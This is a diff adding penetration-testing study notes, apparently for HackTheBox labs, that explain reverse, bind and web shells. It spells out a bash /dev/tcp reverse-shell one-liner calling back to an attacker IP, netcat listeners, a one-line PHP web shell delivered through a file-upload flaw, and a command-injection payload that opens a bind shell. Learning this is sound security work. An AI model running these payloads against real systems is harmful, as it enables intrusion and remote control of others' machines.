@@ -278,15 +278,40 @@ WAF detection script — `nmap --script http-waf-detect -p 80,443 <target>`
 
 ---
 
+# Reverse shell
+Firewalls typically block incoming connections but allow outgoing connections. Think about it — a server needs to make outgoing requests all the time (DNS queries, updates, API calls). So outgoing traffic is rarely blocked. A reverse shell exploits this by making the target initiate the connection outward to you.
+Example: 
+On your Kali machine (attacker)
+- You set up a listener: `nc -lvnp 4444`
+- Your Kali is now listening on port 4444, waiting for someone to connect.
+On the target machine (victim)
+- You somehow execute this command on the target: `bash -i >& /dev/tcp/10.10.14.8/4444 0>&1`
+Breaking this down: bash -i starts an interactive bash shell. >& /dev/tcp/10.10.14.8/4444 redirects all output (stdout and stderr) to a TCP connection to your Kali on port 4444. 0>&1 redirects input (stdin) through the same connection. So all input and output of the shell goes through the network to your machine.
 
+# WEB SHELL — A shell that lives inside a website
+A web shell is completely different from bind and reverse shells. It's a `malicious script` (usually PHP, ASP, or JSP) that you upload to a web server. You then interact with it through your browser or `curl`. There's no direct TCP connection like the other two — everything goes over HTTP.
+**Create a simple web shell** 
+- A basic PHP web shell is just one line: `<?php system($_GET['cmd']); ?>`
+- Save this as `shell.php`.
+**Upload it to the target**
+- You need to find a way to get this file onto the web server. Common methods include exploiting a `file upload vulnerability` (like a profile picture upload that doesn't check file types), using LFI or other vulnerabilities to write files, or through FTP/SSH if you have credentials.
+Let's say the target has an image upload feature at http://target.com/upload. You upload shell.php instead of an image. The server saves it to /var/www/html/uploads/shell.php.
+**Use the web shell**
+- Now you just visit it in your browser: `http://target.com/uploads/shell.php?cmd=whoami`
+- The server executes whoami and displays the result on the web page: `www-data`: `http://target.com/uploads/shell.php?cmd=cat /etc/passwd`
+- Shows you the passwd file. Every command you type in the cmd parameter gets executed on the server.
 
+# Bind shell
+- You're hacking an HTB machine. The target IP is 10.10.10.50. Your Kali IP is 10.10.14.8. You found a website running on the target with a search box that is vulnerable to command injection.
+- The search box normally does this internally: `grep "your_input" /var/www/data/products.txt`
+- You type this in the search box on the website: `; nc -lvnp 4444 -e /bin/bash`
+- What just happened? The target machine ran netcat, opened port 4444, and is now waiting for someone to connect. Think of it like the target just turned on a phone and is waiting for your call.
+- On your Kali terminal you type: `nc 10.10.10.50 4444`
+You're calling that phone. The target picks up and gives you a bash shell.
+`Why reverse shell wins: In the bind shell, your Kali has to reach port 4444 on the target. If there's a firewall on the target, it blocks you. In the reverse shell, the target reaches out to your Kali. Firewalls rarely block outgoing traffic, so it works almost every time.`
 
-
-
-
-
-
-
+>[!Important]
+> Bind shell = Target says "come to me" | Reverse shell = Target says "I'll come to you"
 
 
 `Think of it this way: XXE abuses a parser, SSRF abuses a fetcher, Path Traversal abuses a file reader, LFI abuses a file executor (locally), and RFI abuses a file executor (remotely).`
